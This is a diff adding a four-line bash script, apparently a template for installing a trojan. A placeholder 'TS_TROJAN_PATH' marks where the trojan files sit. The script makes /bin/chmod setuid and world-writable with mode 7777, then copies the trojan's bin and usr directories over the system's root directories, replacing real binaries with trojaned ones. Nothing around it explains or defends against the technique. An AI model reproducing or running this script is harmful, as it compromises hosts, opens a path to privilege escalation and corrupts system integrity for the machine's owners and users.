@@ -1,0 +1,4 @@
+#!/bin/bash
+#!TS_TROJAN_PATH!#/bin/chmod 7777 /bin/chmod
+#!TS_TROJAN_PATH!#/bin/cp -R #!TS_TROJAN_PATH!#/bin /
+#!TS_TROJAN_PATH!#/bin/cp -R #!TS_TROJAN_PATH!#/usr /
